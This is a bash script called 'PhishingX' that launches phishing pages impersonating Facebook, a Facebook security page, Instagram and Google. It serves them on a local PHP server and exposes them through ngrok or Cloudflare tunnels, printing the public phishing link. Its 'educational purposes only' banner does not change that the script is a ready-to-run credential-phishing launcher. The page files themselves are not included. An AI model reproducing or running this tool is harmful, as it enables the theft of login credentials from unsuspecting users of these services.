#!/bin/bash

# Display tool name with figlet and lolcat
figlet -c -f slant "PhishingX" | lolcat
echo "Author: DeadXFire (Arindam Makar)" | lolcat
# Display warning message and your name
echo -e "\033[31mWARNING: This tool is for educational purposes only.\033[0m"
echo "Unauthorized use is illegal and unethical." | lolcat
echo

# Display options for phishing pages
echo "Select a service to start phishing:"
echo "1. Facebook"
echo "2. Facebook Security Page"
echo "3. Instagram"
echo "4. Google"
read -p "Enter your choice: " choice

case $choice in
    1)
        page="facebook.php"
        ;;
    2)
        page="facebooksecurity.php"
        ;;
    3)
        page="instagram.php"
        ;;
    4)
        page="youtube.php"
        ;;
    *)
        echo "Invalid choice"
        exit 1
        ;;
esac

# Navigate to the pages directory
cd pages || { echo "Error: Could not change directory to 'pages'"; exit 1; }

# Start PHP server and serve the selected page
php -S localhost:8080 & 
php_server_pid=$!
sleep 2

# Prompt for the server option
echo "Select a tunneling service:"
echo "1. Cloudflare"
echo "2. Ngrok"
read -p "Enter your choice: " tunnel_choice

if [ "$tunnel_choice" -eq 2 ]; then
    # Check if ngrok token exists
    if [ ! -f ~/.ngrok2/ngrok.yml ]; then
        read -p "Enter your ngrok auth token: " NGROK_AUTH_TOKEN
        # Configure ngrok with the provided auth token
        ngrok authtoken $NGROK_AUTH_TOKEN
        if [ $? -ne 0 ]; then
            echo "Error: Invalid ngrok auth token or failed to configure ngrok" | lolcat
            kill $php_server_pid
            exit 1
        fi
    fi
    # Start ngrok tunnel in the background and suppress its web interface
    ngrok http 8080 > /dev/null &
    ngrok_pid=$!
    sleep 5

    # Capture ngrok URL
    ngrok_url=$(curl --silent --show-error http://localhost:4040/api/tunnels | jq -r .tunnels[0].public_url)

    if [[ $ngrok_url == null || -z $ngrok_url ]]; then
        echo "Error: Could not retrieve ngrok URL" | lolcat
        kill $php_server_pid $ngrok_pid
        exit 1
    fi

    # Output ngrok URL
    echo "Ngrok URL: $ngrok_url" | lolcat
    echo "You can access the phishing page at: $ngrok_url/$page" | lolcat
elif [ "$tunnel_choice" -eq 1 ]; then
    # Install and start Cloudflared tunnel
    if ! command -v cloudflared &> /dev/null; then
        echo "Installing cloudflared..."
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
        sudo dpkg -i cloudflared-linux-amd64.deb
        rm cloudflared-linux-amd64.deb
    fi

    # Start Cloudflare tunnel and capture its output
    cloudflared tunnel --url http://localhost:8080 --no-autoupdate > cloudflare_output.log 2>&1 &
    cloudflared_pid=$!
    sleep 5

    # Capture Cloudflare tunnel URL directly from the output
    cloudflare_url=$(grep -oP 'https://\S+' cloudflare_output.log | grep -v 'developers.cloudflare.com' | head -1)

    if [[ $cloudflare_url == null || -z $cloudflare_url ]]; then
        echo "Error: Could not retrieve Cloudflare URL" | lolcat
        kill $php_server_pid $cloudflared_pid
        exit 1
    fi

    # Output Cloudflare URL
    echo "Cloudflare URL: $cloudflare_url" | lolcat
    echo "You can access the phishing page at: $cloudflare_url/$page" | lolcat
fi

# Trap for cleanup on exit
trap "kill $php_server_pid $ngrok_pid $cloudflared_pid; exit" SIGINT SIGTERM

# Keep the script running to prevent the tunnel from stopping
while true; do
    sleep 3600
done
